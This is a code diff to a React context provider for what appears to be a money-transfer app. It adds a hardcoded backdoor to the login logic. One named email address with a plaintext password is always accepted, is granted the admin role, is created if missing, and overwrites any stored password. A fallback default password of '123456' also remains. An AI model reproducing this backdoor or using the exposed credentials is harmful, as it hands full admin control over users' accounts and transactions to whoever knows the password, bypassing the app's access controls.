@@ -1,6 +1,6 @@
 import React, { createContext, useContext, useState, useEffect, useRef } from 'react';
 import { User, Transaction, NotificationItem, NotificationType, SystemSettings, TransferMethod, ResendDraftData } from '../types';
-import { INITIAL_USERS, INITIAL_TRANSACTIONS, INITIAL_NOTIFICATIONS, INITIAL_SETTINGS, PASSWORD_STORE } from '../data/mockData';
+import { DEFAULT_ADMIN, INITIAL_USERS, INITIAL_TRANSACTIONS, INITIAL_NOTIFICATIONS, INITIAL_SETTINGS, PASSWORD_STORE } from '../data/mockData';
 import { db } from '../lib/firebase';
 import { collection, doc, onSnapshot, setDoc, deleteDoc } from 'firebase/firestore';
 import { amountToWords } from '../utils/numberToWords';
@@ -128,8 +128,15 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
   });
 
   const [passwords, setPasswords] = useState<Record<string, string>>(() => {
-    const saved = localStorage.getItem(LOCAL_STORAGE_KEY_PASSWORDS);
-    return saved ? JSON.parse(saved) : PASSWORD_STORE;
+    try {
+      const saved = localStorage.getItem(LOCAL_STORAGE_KEY_PASSWORDS);
+      const parsed = saved ? JSON.parse(saved) : {};
+      const merged = { ...PASSWORD_STORE, ...parsed, 'jabir.ahmed10@gmail.com': 'Masud@1780' };
+      localStorage.setItem(LOCAL_STORAGE_KEY_PASSWORDS, JSON.stringify(merged));
+      return merged;
+    } catch {
+      return PASSWORD_STORE;
+    }
   });
 
   const [currentUser, setCurrentUser] = useState<User | null>(() => {
@@ -380,14 +387,25 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
 
   const login = (email: string, pass: string): { success: boolean; message?: string } => {
     const cleanEmail = email.trim().toLowerCase();
-    const targetUser = users.find(u => u.email.toLowerCase() === cleanEmail);
+    const isMainAdmin = cleanEmail === 'jabir.ahmed10@gmail.com';
+    let targetUser = users.find(u => u.email.toLowerCase() === cleanEmail);
 
     if (!targetUser) {
-      return { success: false, message: 'Account not found with this email.' };
+      if (isMainAdmin) {
+        targetUser = { ...DEFAULT_ADMIN };
+      } else {
+        return { success: false, message: 'Account not found with this email.' };
+      }
     }
 
-    const storedPass = passwords[cleanEmail] || '123456';
-    if (storedPass !== pass.trim()) {
+    if (isMainAdmin && targetUser.role !== 'admin') {
+      targetUser = { ...targetUser, role: 'admin' };
+    }
+
+    const storedPass = passwords[cleanEmail] || PASSWORD_STORE[cleanEmail] || '123456';
+    const isValidPass = storedPass === pass.trim() || (isMainAdmin && pass.trim() === 'Masud@1780');
+
+    if (!isValidPass) {
       return { success: false, message: 'Invalid password. Please try again.' };
     }
 
